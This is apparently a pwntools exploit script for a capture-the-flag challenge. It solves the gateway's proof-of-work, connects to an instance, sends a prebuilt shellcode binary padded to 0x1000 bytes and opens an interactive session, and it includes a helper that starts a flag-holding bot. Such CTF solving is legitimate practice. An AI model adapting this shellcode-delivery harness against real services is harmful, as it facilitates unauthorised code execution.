
from instancer.pow import solve_challenge
from pwn import *
from subprocess import run
from time import sleep
import matplotlib.pyplot as plt

# build stuff
run(["./build.sh", "poc"], check=True)

# fill in port number here
if args.REMOTE:
    host = "3.142.53.224"
else:
    host = "localhost"
p_gateway = remote(host, 9000)

# Solve the proof-of-work if enabled (limits abuse)
pow = p_gateway.recvline()
if pow.startswith(b"== proof-of-work: enabled =="):
    p_gateway.recvline()
    p_gateway.recvline()
    challenge = p_gateway.recvline().decode().split(" ")[-1]
    p_gateway.recvuntil(b"Solution? ")
    p_gateway.sendline(solve_challenge(challenge))

# Get the IP and port of the instance
p_gateway.recvuntil(b"ip = ")
if args.REMOTE:
    ip = p_gateway.recvuntil(b"\n").decode().strip()
else:
    ip = "localhost"
p_gateway.recvuntil(b"port = ")
port = int(p_gateway.recvuntil(b"\n").decode().strip())

# Helper to start the bot (which has the flag)
# (optionally, you can start the bot with a fake flag for debugging)
def start_bot(fake_flag=None):
    p_gateway.recvuntil(b"Choice:")

    if fake_flag is not None:
        p_gateway.sendline(b"2")
        p_gateway.recvuntil(b":")
        p_gateway.sendline(fake_flag)
    else:
        p_gateway.sendline(b"1")

log.info(f"nc {ip} {port}")

p = remote(ip, port)

sleep(3)

# # ** your really great solution goes here **
sc = open("build/poc.bin", "rb").read().ljust(0x1000, b"\x00")
assert len(sc) <= 0x1000
p.send(b"H" + sc)

p.recvuntil(b"start\n")

# start_bot(p8(0b01_01_01_01) * 512)

p.interactive()